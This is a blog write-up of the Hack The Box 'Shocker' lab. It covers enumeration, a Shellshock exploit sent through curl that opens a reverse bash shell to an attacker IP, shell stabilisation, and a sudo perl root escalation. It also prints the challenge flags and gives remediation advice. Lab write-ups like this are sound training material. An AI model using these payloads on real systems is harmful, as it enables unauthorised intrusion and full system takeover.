# Shocker

The deadly cost of ignoring patches.🔥 See how a legendary bug crushed this server. Don't leave your door open! 👇

***

### ⚡ Shocker: Shellshock Exploitation & Sudo Privilege Escalation

![](https://cdn-images-1.medium.com/max/800/1*ZEC_x5jy76wapcRZOhHfSQ.png)

> [**Not a Member?? Click Here to read Full-Story**](https://medium.com/meetcyber/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f?sk=ffffb4bbd623bfab236886639b2ec034)

**Target:** _Shocker (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ **Attack Vectors:** _Shellshock (CGI) -> Sudo Misconfiguration (Perl)._

### Executive Summary

This assessment targeted “Shocker,” a Linux server vulnerable to the infamous “Shellshock” bug (CVE-2014–6271). The initial foothold was achieved by identifying a hidden **`/cgi-bin/`** directory hosting a bash script (**`user.sh`**). By sending a crafted HTTP header to this script, I triggered remote code execution (RCE) and obtained a shell as the user **`shelly`**. Root compromise was achieved by enumerating sudo privileges. The user **`shelly`** was permitted to execute **`/usr/bin/perl`** as root without a password. I leveraged this misconfiguration to spawn a root shell instantly.

***

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

We began the assessment with a comprehensive Nmap scan to identify open ports and services on **`10.10.10.56`**.

```
nmap -sC -sV -A -vvv 10.10.10.56 -Pn
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```

#### 1.1.2 Nmap Scan Analysis

The scan revealed two entry points:

* **Port 80 (HTTP):** Running Apache 2.4.18. The site has no title, which suggests a minimal or broken configuration.
* **Port 2222 (SSH):** SSH is running on a non-standard port (2222 instead of 22). This is often done to evade simple scanners.

**Operating System:** The banner confirms the target is **Ubuntu Linux**.

#### 1.1.3 Key Findings

* **Port 80:** Apache httpd 2.4.18.
* **Port 2222:** OpenSSH 7.2p2.
* **Context:** The box name “Shocker” and the presence of an Apache web server strongly suggest the **Shellshock** vulnerability (CVE-2014–6271), which affects CGI scripts.

#### 1.2 Web Directory Enumeration

**1.2.1** With the web server identified, we need to map the directory structure. Specifically, we are looking for the **`/cgi-bin/`** directory. This directory is used for scripts (Common Gateway Interface) and is the primary vector for Shellshock attacks.

**1.2.2 Execution** We will use **Gobuster** to find the directory, and then fuzz for scripts inside it.

**Command:**

```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi,pl -t 50
```

**Findings:** The scan identified a critical file:

![](https://cdn-images-1.medium.com/max/800/1*683rc4_GxgoeD1G_wSZ2QA.png)

* **`/user.sh`** (Status: 200)

1. **2.3 Analysis:** The presence of a Bash script (**`user.sh`**) in the **`/cgi-bin/`** directory confirms the potential for a **Shellshock** (CVE-2014-6271) attack. This vulnerability allows an attacker to inject arbitrary commands via environment variables (like the **`User-Agent`** HTTP header), which the Bash shell inadvertently executes.

### 2.0 Exploitation

#### 2.1 Establishing a Reverse Shell

**2.1.1** We confirmed the target script (**`user.sh`**) is vulnerable. The objective now is to leverage this flaw to obtain a reverse shell.

**2.1.2 Methodology:**

* I will intercept the HTTP request to **`user.sh`** and modify the **`User-Agent`** header. By injecting the magic string **`() { :;};`** followed by a reverse shell command, I can force the server to connect back to my attack machine.

**Payload:** **`() { :;}; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`**

#### 2.1.3 Next Step: Execute the Exploit

* Let’s get that shell.

**Step 1: Start your Listener** In your Linux terminal, start listening for the connection.

```
nc -lvnp 4444
```

**Step 2: Fire the Exploit** Run this command in a **new terminal tab**. _(I am using IP_ _**`10.10.14.32`**_ _your’s will not be the same, update it!)_

```
curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.32/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

**Check your listener.** You should see a connection from the target.

#### 2.2 Shell Stabilization

**2.2.1** The initial shell obtained via Netcat was unstable (non-interactive). To prevent accidental disconnection and enable features like text editing and tab completion, I upgraded the session.

**2.2.2 Methodology** I used Python to spawn a pseudo-terminal (PTY) and adjusted the local terminal settings to pass keyboard shortcuts correctly.

**Commands:**

* **`python3 -c 'import pty; pty.spawn("/bin/bash")'`**
* **`Ctrl + Z`** (Background process)
* **`stty raw -echo; fg`** (Foreground process with raw input)
* **`export TERM=xterm`**

### 3.0 Post-Exploitation

#### 3.1 Local Enumeration & User Flag

**3.1.1** With a stable shell, I navigated to the **`/home`** directory to identify valid users and retrieve the user flag.

**Command:**

```
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
343b0cdfd8511df6c050c63c457af677
```

### 4.0 Privilege Escalation:

#### 4.1 Lateral Movement

**4.1.1 Enumeration** To identify potential escalation vectors, I checked the sudo privileges for the current user.

**Command:** **`sudo -l`**

**Findings:**

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**4.1.2 Analysis** The configuration explicitly allows **`shelly`** to execute the Perl binary as **root** without a password. Perl is a powerful scripting language that interacts directly with the system kernel. By invoking a shell from within a Perl script running with sudo, we can break out of the restricted environment.

**4.1.3 Exploitation Strategy** I will execute a simple Perl one-liner that invokes **`/bin/bash`**. Because the Perl process is initiated via **`sudo`**, the child process (bash) will inherit root privileges.

### 5.0 Root Escalation

#### **5.1 Total Compromise**

**5.1.1 The Exploit** I executed the following command to spawn a root shell:

**Command:**

```
sudo perl -e 'exec "/bin/bash";'
```

**5.1.2 Execution & Capture** The command executed instantly, changing the prompt from **`$`** to **`#`**.

**Root Flag:**

```
root@Shocker:/usr/lib/cgi-bin# cat /root/root.txt
6adc27e4d15e153efe32d2587f52847b
```

### 6.0 Conclusion

The compromise of “Shocker” highlights the danger of legacy systems and configuration drift. The initial foothold relied on a vulnerability (Shellshock) that was disclosed years ago, yet the server remained unpatched. It serves as a stark reminder that “old” vulnerabilities are only “dead” if they are actually patched.

From there, privilege escalation was trivialized by a “convenience” configuration in sudoers. Allowing a user to run a language interpreter like Perl (or Python, Ruby, etc.) as root is functionally equivalent to giving them a root shell. The combination of an outdated patch level and loose internal permissions led to a total system compromise in under 15 minutes.

### Red Team Mandate

As a Red Teamer, my job is to demonstrate the impact of these misconfigurations. The following remediation steps are critical:

**Remediation Strategy**

1. **Patch Management:** The server is running a version of Bash vulnerable to CVE-2014–6271. Update Bash immediately (**`apt-get update && apt-get upgrade bash`**).
2. **Sudo Restrictions:** The **`shelly`** user has excessive privileges. Remove the **`NOPASSWD`** entry for **`/usr/bin/perl`** in **`/etc/sudoers`**. If the user needs to run specific Perl scripts, allow _only_ those specific script paths (e.g., **`/usr/bin/perl /opt/scripts/backup.pl`**), not the entire binary.
3. **CGI Hygiene:** If CGI functionality is not strictly required, disable the **`cgi-module`** in Apache to prevent execution of scripts in **`/cgi-bin/`**.

### The Biblical Tie-In

The flaw in “Shocker” was an old wound left untreated. The system administrators likely knew about Shellshock but assumed, “It won’t happen to us,” or simply forgot to apply the patch. They ignored the warning signs.

> _**“He who ignores discipline comes to poverty and shame, but whoever heeds correction is honored.” — Proverbs 13:18 (NIV)**_

**Application:** In cybersecurity, “correction” often comes in the form of patches and security advisories. Ignoring them leads to “poverty and shame” — the loss of data and reputation. The administrators of this box ignored the discipline of patch management.

As professionals, we must be humble enough to heed correction. When a vulnerability is announced (like a spiritual conviction), we must act on it immediately, rather than letting it fester until it becomes a breach.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/y5P9NrzUBX)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 1, 2026](https://medium.com/p/1b53c202699f).

[Canonical link](https://medium.com/@nicholasmullenski/shocker-from-403-forbidden-to-root-in-under-10-mins-1b53c202699f)

Exported from [Medium](https://medium.com) on September 1, 2026.
